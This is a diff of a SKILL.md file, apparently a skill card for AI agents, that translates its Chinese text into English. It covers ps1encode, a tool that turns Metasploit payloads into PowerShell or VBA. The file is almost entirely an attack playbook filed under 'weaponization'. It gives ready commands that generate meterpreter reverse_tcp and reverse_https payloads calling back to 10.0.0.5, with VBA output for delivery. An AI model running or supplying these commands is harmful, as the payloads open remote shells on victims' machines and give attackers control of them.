@@ -2,37 +2,38 @@
 name: ps1encode-ps
 description: "ps1encode: Converts MSF payloads to PowerShell. Signals: payload development, weaponization, VBA output."
 zh-signals: "ps1encode: MSF payload PowerShell 化。信号:载荷开发,武器化,VBA 输出。"
+when-to-use: "Use when converting an MSF payload into PowerShell or VBA output for weaponized delivery in an authorized engagement."
 ---
 
 # ps1encode
 
-- 攻击大类:C07 载荷开发与武器化
-- 上游仓库:https://github.com/CroweCybersecurity/ps1encode
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload Development and Weaponization
+- Upstream Repository: https://github.com/CroweCybersecurity/ps1encode
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/CroweCybersecurity/ps1encode
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `ruby ps1encode.rb -i x86/meterpreter/reverse_tcp -a 10.0.0.5 -p 4444` | PowerShell 编码 |
-| `-a arch -i payload -p port` | 参数 |
-| `-t vba` | VBA 输出 |
+| `ruby ps1encode.rb -i x86/meterpreter/reverse_tcp -a 10.0.0.5 -p 4444` | PowerShell encoding |
+| `-a arch -i payload -p port` | Parameters |
+| `-t vba` | VBA output |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### MSF payload PowerShell 化
+### MSF payload to PowerShell
 
 ```bash
 ruby ps1encode.rb -i x64/meterpreter_reverse_https -a 10.0.0.5 -p 443
-# 一键编码
+# One-shot encoding
 ```
 
-## 注意事项
+## Notes
 
-MSF payload 转 PowerShell,多编码。
+Converts MSF payloads to PowerShell with multiple encodings.
